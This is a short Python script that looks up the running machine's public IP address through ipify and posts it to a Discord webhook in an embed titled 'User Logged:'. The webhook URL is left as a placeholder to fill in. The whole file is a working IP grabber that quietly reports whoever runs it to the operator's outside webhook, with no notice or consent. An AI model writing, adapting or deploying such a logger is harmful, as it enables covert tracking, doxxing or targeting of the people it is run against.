import requests
import logging
import datetime

def setup_logging():
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def get_ip():
    try:
        headers = {
            'User-Agent': 'MyCustomUserAgent/1.0'
        }
        response = requests.get('https://api64.ipify.org?format=json', headers=headers)
        data = response.json()
        return data.get('ip')
    except Exception as e:
        logging.error("Error getting public IP: %s", e)
        return None

def send_to_webhook(webhook_url, ip_address):
    try:
        embed = {
            "title": "User Logged:",
            "description": f"User IP Address: {ip_address}",
            "timestamp": datetime.datetime.utcnow().isoformat(),
            "color": 16711680
        }

        data = {
            "embeds": [embed]
        }

        response = requests.post(webhook_url, json=data)
        
        if response.status_code == 204:
            logging.info("Data sent successfully to Discord webhook.")
        else:
            logging.error("Failed to send data to Discord webhook. Status code: %d", response.status_code)
    except Exception as e:
        logging.error("Error sending data to Discord webhook: %s", e)

if __name__ == "__main__":
    setup_logging()

    webhook_url = "WEBHOOK_URL_HERE"

    user_ip = get_ip()

    if user_ip:
        send_to_webhook(webhook_url, user_ip)
